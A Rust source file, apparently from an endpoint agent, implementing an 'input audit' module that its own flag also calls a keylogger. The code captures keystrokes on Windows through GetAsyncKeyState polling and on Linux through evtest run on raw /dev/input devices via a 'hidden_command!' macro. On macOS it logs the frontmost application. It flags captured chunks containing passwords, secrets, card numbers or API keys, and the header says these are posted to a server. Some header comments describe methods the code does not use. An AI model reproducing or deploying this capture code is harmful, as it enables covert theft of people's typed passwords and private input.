/// input_audit.rs — Keystroke / Input Audit Module
/// Captures keyboard input when InputAuditEnabled (KeyloggerEnabled) = true.
///
/// Windows: PowerShell Get-Clipboard + GetAsyncKeyState sampling via WScript
/// Linux:   Reads from /dev/input/event* keyboard nodes (requires root/input group)
/// macOS:   Uses `log stream` to detect key-based app events (coarse — no raw keys without TCC bypass)
///
/// Keystrokes are buffered in 30-second windows and posted as a report event to
/// POST /api/events/report  { type: "KeystrokeLog", agent_id, chunk, timestamp }

use serde_json::{json, Value};
use std::sync::Mutex;

static BUFFER: Mutex<Vec<String>> = Mutex::new(Vec::new());

/// Called from the 30-second input capture loop.
/// Returns a batch of captured keystrokes if the buffer is non-empty, clearing it.
pub fn flush_keystroke_buffer() -> Option<Value> {
    let mut buf = BUFFER.lock().ok()?;
    if buf.is_empty() {
        return None;
    }
    let chunk = buf.join("");
    buf.clear();

    let lower_chunk = chunk.to_lowercase();
    let keywords = ["password", "confidential", "secret", "credit card", "api_key"];
    let is_alert = keywords.iter().any(|k| lower_chunk.contains(k));
    let severity = if is_alert { "Critical" } else { "Low" };

    Some(json!({
        "Type":      "KeystrokeLog",
        "Details":   chunk,
        "Timestamp": chrono::Utc::now().to_rfc3339(),
        "IsAlert":   is_alert,
        "Severity":  severity,
    }))
}

/// Sample keystrokes for ~5 seconds and push into BUFFER.
/// Called every 30 seconds from the scan loop.
pub fn sample_keystrokes() {
    #[cfg(target_os = "windows")]
    sample_windows();

    #[cfg(target_os = "linux")]
    sample_linux();

    #[cfg(target_os = "macos")]
    sample_macos();
}

// ── Windows ───────────────────────────────────────────────────────────────────
// Uses PowerShell to read the current clipboard (captures recently typed/pasted text)
// and a WScript key-state sampler for a 5-second window.

#[cfg(target_os = "windows")]
fn sample_windows() {
    use std::time::Instant;
    use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;

    let end_time = Instant::now() + std::time::Duration::from_secs(5);
    let mut result = String::new();
    
    // Map of common keys (simple naive implementation like the PS script)
    let keys = vec![
        (32, "[Space]"), (8, "[Back]"), (13, "[Enter]"), (9, "[Tab]"),
        (27, "[Esc]"), (46, "[Del]"), (37, "[Left]"), (38, "[Up]"), 
        (39, "[Right]"), (40, "[Down]")
    ];

    while Instant::now() < end_time {
        unsafe {
            for (vk, name) in &keys {
                if (GetAsyncKeyState(*vk as i32) as u16 & 0x8000) != 0 {
                    result.push_str(name);
                }
            }
            // A-Z and 0-9
            for vk in 48..=57 {
                if (GetAsyncKeyState(vk) as u16 & 0x8000) != 0 {
                    result.push(vk as u8 as char);
                }
            }
            for vk in 65..=90 {
                if (GetAsyncKeyState(vk) as u16 & 0x8000) != 0 {
                    result.push(vk as u8 as char);
                }
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    
    if !result.is_empty() {
        if let Ok(mut buf) = BUFFER.lock() {
            buf.push(result);
        }
    }
}

// ── Linux ─────────────────────────────────────────────────────────────────────
// Read raw events from /dev/input/event* keyboard devices via `evtest --query`
// or parse /proc/bus/input/devices to find keyboard event node.

#[cfg(target_os = "linux")]
fn sample_linux() {
    // Find keyboard input device
    let kbd_node = find_keyboard_node();
    let Some(node) = kbd_node else { return; };

    // Use `timeout 5 evtest <node>` if available, parse key press events
    if let Ok(out) = crate::hidden_command!("timeout")
        .args(&["5", "evtest", &node])
        .output()
    {
        let text = String::from_utf8_lossy(&out.stdout);
        let mut keys = String::new();
        for line in text.lines() {
            // Lines like: "Event: type 1 (EV_KEY), code 30 (KEY_A), value 1"
            if line.contains("EV_KEY") && line.contains("value 1") {
                if let Some(key) = extract_linux_key(line) {
                    keys.push_str(&key);
                }
            }
        }
        if !keys.is_empty() {
            if let Ok(mut buf) = BUFFER.lock() {
                buf.push(keys);
            }
        }
    }
}

#[cfg(target_os = "linux")]
fn find_keyboard_node() -> Option<String> {
    let devices = std::fs::read_to_string("/proc/bus/input/devices").ok()?;
    let mut in_kbd = false;
    let mut handler = None;
    for line in devices.lines() {
        if line.contains("EV=120013") || (line.contains("N: Name=") && line.to_lowercase().contains("keyboard")) {
            in_kbd = true;
        }
        if in_kbd && line.starts_with("H: Handlers=") {
            for token in line.split_whitespace() {
                if token.starts_with("event") {
                    handler = Some(format!("/dev/input/{}", token));
                    break;
                }
            }
            break;
        }
        if line.is_empty() { in_kbd = false; }
    }
    handler
}

#[cfg(target_os = "linux")]
fn extract_linux_key(line: &str) -> Option<String> {
    // Extract KEY_X from the line and convert to printable char
    if let Some(start) = line.find("KEY_") {
        let key_str = &line[start + 4..];
        let key_name: &str = key_str.split(')').next().unwrap_or("").trim();
        let ch = match key_name {
            "SPACE"  => " ".to_string(),
            "ENTER"  => "\n".to_string(),
            "BACKSPACE" => "[Back]".to_string(),
            "TAB"    => "\t".to_string(),
            "LEFTSHIFT" | "RIGHTSHIFT" | "LEFTCTRL" | "RIGHTCTRL"
            | "LEFTALT" | "RIGHTALT" => return None,
            name if name.len() == 1 => name.to_lowercase(),
            _ => format!("[{}]", key_name),
        };
        return Some(ch);
    }
    None
}

// ── macOS ─────────────────────────────────────────────────────────────────────
// macOS does not allow raw key capture without TCC accessibility permission.
// We do a coarse capture: log recently active app + window title changes as proxy.

#[cfg(target_os = "macos")]
fn sample_macos() {
    if let Ok(out) = crate::hidden_command!("osascript")
        .args(&["-e", "tell application \"System Events\" to get name of first application process whose frontmost is true"])
        .output()
    {
        let app = String::from_utf8_lossy(&out.stdout).trim().to_string();
        if !app.is_empty() {
            if let Ok(mut buf) = BUFFER.lock() {
                buf.push(format!("[ActiveApp:{}]", app));
            }
        }
    }
}
